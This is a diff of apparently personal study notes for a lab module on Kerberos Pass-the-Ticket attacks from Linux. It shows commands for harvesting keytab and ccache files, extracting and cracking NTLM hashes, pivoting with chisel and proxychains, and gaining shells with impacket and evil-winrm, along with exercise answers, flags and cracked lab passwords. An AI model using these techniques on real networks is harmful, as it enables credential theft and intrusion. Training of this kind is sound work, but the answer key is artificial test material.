@@ -17,7 +17,7 @@ Another everyday use of Kerberos in Linux is with [keytab files](https://service
 ### realm - Check if Linux machine is domain-joined
 We can identify if the Linux machine is domain-joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.
 
-```sh
+```shellsession
 david@inlanefreight.htb@linux01:~$ realm list
 
 inlanefreight.htb
@@ -44,7 +44,7 @@ The output of the command indicates that the machine is configured as a Kerberos
 ### PS - Check if Linux machine is domain-joined
 Looking for [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) or [sssd](https://sssd.io/) running in the machine is another way to identify if it is domain-joined. 
 
-```sh
+```shellsession
 david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"
 
 root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
@@ -57,7 +57,7 @@ root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam -
 ### Finding KeyTab files
 A straightforward approach is to use `find` to search for files whose name contains the word `keytab`. When an administrator commonly creates a Kerberos ticket to be used with a script, it sets the extension to `.keytab.` Although not mandatory, it is a way in which administrators commonly refer to a keytab file.
 
-```sh
+```shellsession
 david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
 
 ...SNIP...
@@ -70,7 +70,7 @@ david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
 
 Another way to find **KeyTab** files is in automated scripts configured using a cronjob or any other Linux service. If an administrator needs to run a script to interact with a Windows service that uses Kerberos, and if the keytab file does not have the `.keytab` extension, we may find the appropriate filename within the script.
 
-```sh
+```shellsession
 carlos@inlanefreight.htb@linux01:~$ crontab -l
 
 # Edit this file to introduce tasks to be run by cron.
@@ -95,7 +95,7 @@ In this example, we found a script importing a Kerberos ticket (`svc_workstation
 ### Finding ccache files
 A credential cache or ccache file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the KRB5CCNAME environment variable. This variable is used by tools that support Kerberos authentication to find the Kerberos data. 
 
-```sh
+```shellsession
 david@inlanefreight.htb@linux01:~$ env | grep -i krb5
 
 KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
@@ -103,7 +103,7 @@ KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
 
 ccache files are located, by default, at `/tmp`. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their ccache file while it is still valid.
 
-```sh
+```shellsession
 david@inlanefreight.htb@linux01:~$ ls -la /tmp
 
 total 68
@@ -119,7 +119,7 @@ As attackers, we may have several uses for a keytab file. The first thing we can
 
 ### Listing KeyTab file information
 
-```sh
+```shellsession
 david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 
 
 Keytab name: FILE:/opt/specialfiles/carlos.keytab
@@ -132,7 +132,7 @@ The ticket corresponds to the user Carlos. We can now impersonate the user with 
 
 ### Impersonating a user with a KeyTab
   
-```sh
+```shellsession
 david@inlanefreight.htb@linux01:~$ klist 
 
 Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
@@ -153,7 +153,7 @@ Valid starting     Expires            Service principal
 
 We can attempt to access the shared folder \\dc01\carlos to confirm our access.
 
-```sh
+```shellsession
 david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls
 
   .                                   D        0  Thu Oct  6 14:46:26 2022
@@ -188,7 +188,7 @@ With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AE
 
 The most straightforward hash to crack is the NTLM hash. We can use tools like [Hashcat](https://hashcat.net/) or [John the Ripper](https://www.openwall.com/john/) to crack it. However, a quick way to decrypt passwords is with online repositories such as https://crackstation.net/, which contains billions of passwords.
 
-```sh
+```shellsession
 david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
 
 Password: 
@@ -210,7 +210,7 @@ As root, we need to identify which tickets are present on the machine, to whom t
 
 ### Looking for ccache files
 
-```sh
+```shellsession
 root@linux01:~# ls -la /tmp
 
 total 76
@@ -226,7 +226,7 @@ drwxr-xr-x 20 root                               root                           
 
 ### Identifying group membership with the id command
 
-```sh
+```shellsession
 root@linux01:~# id julio@inlanefreight.htb
 
 uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
@@ -238,7 +238,7 @@ To use a ccache file, we can copy the ccache file and assign the file path to th
 
 ### Importing the ccache file into our current session
 
-```sh
+```shellsession
 root@linux01:~# klist
 
 klist: No credentials cache found (filename: /tmp/krb5cc_0)
@@ -280,7 +280,7 @@ In this scenario, our attack host doesn't have a connection to the **KDC/Domain 
 
 ### Host file modified
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ cat /etc/hosts
 
 # Host addresses
@@ -292,7 +292,7 @@ masterofblafu@htb[/htb]$ cat /etc/hosts
 ### Proxychains configuration file
 We need to modify our proxychains configuration file to use socks5 and port 1080.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ cat /etc/proxychains.conf
 
 ...SNIP...
@@ -303,7 +303,7 @@ socks5 127.0.0.1 1080
 
 ### Download Chisel to our attack host
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
 masterofblafu@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
 masterofblafu@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
@@ -316,13 +316,13 @@ masterofblafu@htb[/htb]$ sudo ./chisel server --reverse
 
 ### Connect to MS01 with xfreerdp
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
 ```
 
 ### Execute chisel from MS01
 
-```sh
+```shellsession
 C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
 
 2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
@@ -334,13 +334,13 @@ C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
 ### Setting the KRB5CCNAME environment variable
 Finally, we need to transfer Julio's ccache file from `LINUX01` and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccache file.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
 ```
 
 ### Using Impacket with proxychains and Kerberos authentication
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ proxychains impacket-wmiexec dc01 -k
 
 [proxychains] config file found: /etc/proxychains.conf
@@ -366,7 +366,7 @@ inlanefreight\julio
 ### Using Evil-WinRM with Kerberos
 To use [evil-winrm](https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called **krb5-user**. While installing, we'll get a prompt for the Kerberos realm. Use the domain name: **INLANEFREIGHT.HTB**, and the KDC is the **DC01**.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ sudo apt-get install krb5-user -y
 
 Reading package lists... Done                                                                                                  
@@ -378,7 +378,7 @@ Reading state information... Done
 
 In case the package krb5-user is already installed, we need to change the configuration file `/etc/krb5.conf` to include the following values:
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ cat /etc/krb5.conf
 
 [libdefaults]
@@ -394,7 +394,7 @@ masterofblafu@htb[/htb]$ cat /etc/krb5.conf
 ...SNIP...
 ```
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb
 
 [proxychains] config file found: /etc/proxychains.conf
@@ -420,7 +420,7 @@ If we want to use a **ccache file** in Windows or a **kirbi file** in a Linux ma
 
 ### Impacket Ticket converter
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -480,7 +480,7 @@ C:\htb>dir \\dc01\julio
 ## Linikatz
 Just like Mimikatz, to take advantage of [Linikatz](https://github.com/CiscoCXSecurity/linikatz), we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with `linikatz.`. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs.
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
 masterofblafu@htb[/htb]$ /opt/linikatz.sh
  _ _       _ _         _
@@ -569,7 +569,7 @@ SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.
    - `$ cat flag.txt` → Read the flag
 2.  Which group can connect to LINUX01? **Answer: Linux Admins**
    - Read permitted-groups:
-        ```sh
+        ```shellsession
         $ realm list
         inlanefreight.htb
           type: kerberos
@@ -591,7 +591,7 @@ SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.
         ```
 3.  Look for a keytab file that you have read and write access. Submit the file name as a response. **Answer: carlos.keytab**
    - Look for files contain the `keytab` string with `rw` access provided to others than just the owner (`-rw-rw-rw-`):
-        ```sh
+        ```shellsession
         $ find / -name *keytab* -ls 2>/dev/null
         287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
         288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
@@ -606,7 +606,7 @@ SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.
         ```
 4.  Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory. **Answer: C@rl0s_1$_H3r3**
    - Extract the hashes from `/opt/specialfiles/carlos.keytab` to retrieve the NTLM hash (`a738f92b3c08b424ec2d99589a9cce60`):
-        ```sh
+        ```shellsession
         $ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
         [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
         [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
@@ -620,7 +620,7 @@ SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.
         ```
    - Crack the NTLM hash using https://crackstation.net reveals carlos' password: `Password5`
    - Login as carlos and read the flag:
-        ```sh
+        ```shellsession
         david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
         Password: 
         carlos@inlanefreight.htb@linux01:~$ cat flag.txt
@@ -628,7 +628,7 @@ SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.
         ```
 5.  Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory. **Answer: 3**
    - Find the keytab file:
-        ```sh
+        ```shellsession
         $ crontab -l
         # Edit this file to introduce tasks to be run by cron.
         # 
@@ -661,7 +661,7 @@ SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.
         smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
         ```
    - But the above keytab file does not have a NTLM hash to crack, try to look at other keytab files located under the same folder:
-        ```sh
+        ```shellsession
         $ ls /home/carlos@inlanefreight.htb/.scripts/
         john.keytab  kerberos_script_test.sh  svc_workstations._all.kt  svc_workstations.kt
         carlos@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
@@ -677,7 +677,7 @@ SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.
         ```
    - Crack the NTLM hash using https://crackstation.net reveals svc_workstations' password: `Password4`
    - Login as svc_workstations and read the flag:
-        ```sh
+        ```shellsession
         david@inlanefreight.htb@linux01:~$ su - svc_workstations@inlanefreight.htb
         Password: 
         svc_workstations@inlanefreight.htb@linux01:~$ cat flag.txt
@@ -685,7 +685,7 @@ SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.
         ```
 6.  Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response. **Answer: Ro0t_Pwn_K3yT4b**
    - User svc_workstations has root privileges:
-        ```sh
+        ```shellsession
         svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
         [sudo] password for svc_workstations@inlanefreight.htb: 
         Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
@@ -695,13 +695,13 @@ SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.
         (ALL) ALL
         ```
    - Read the flag:
-        ```sh
+        ```shellsession
         svc_workstations@inlanefreight.htb@linux01:~$ sudo cat /root/flag.txt
         Ro0t_Pwn_K3yT4b
         ```
 7.  Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio. **Answer: JuL1()_SH@re_fl@g**
    - Check the `/tmp` directory and found 2 Julio's Kerberos tickets:
-        ```sh
+        ```shellsession
         root@linux01:~# ls -la /tmp
         total 84
         drwxrwxrwt 13 root                               root                           4096 Mar  3 03:35 .
@@ -727,7 +727,7 @@ SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.
         drwxrwxrwt  2 root                               root                           4096 Mar  3 02:13 .XIM-unix
         ```
    - Try to import both to find the ticket that has not expired:
-        ```sh
+        ```shellsession
         root@linux01:~# cp /tmp/krb5cc_647401106_aTo6M1 .
         root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_aTo6M1
         root@linux01:~# klist
@@ -739,7 +739,7 @@ SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.
                 renew until 03/04/2026 03:36:03
         ```
    - Read the content of julio.txt:
-        ```sh
+        ```shellsession
         root@linux01:~# smbclient //DC01/julio -k -c ls --no-pass
                 .                                   D        0  Thu Jul 14 12:25:24 2022
                 ..                                  D        0  Thu Jul 14 12:25:24 2022
@@ -750,7 +750,7 @@ SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.
         ```
 8.  Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_). **Answer: 3**
    - Use Linikatz to find LINUX01$ Kerberos ticket:
-        ```sh
+        ```shellsession
         root@linux01:~# /opt/linikatz.sh 
         _ _       _ _         _
         | (_)_ __ (_) | ____ _| |_ ____
@@ -773,7 +773,7 @@ SSH to 10.129.204.23 (ACADEMY-PWATTACKS-LM-MS01) with user "david@inlanefreight.
         <SNIP>
         ```
    - Import that ticket to current session and read the flag:
-        ```sh
+        ```shellsession
         root@linux01:~# cp /var/lib/sss/db/ccache_INLANEFREIGHT.HTB .
         root@linux01:~# export KRB5CCNAME=ccache_INLANEFREIGHT.HTB 
         root@linux01:~# klist
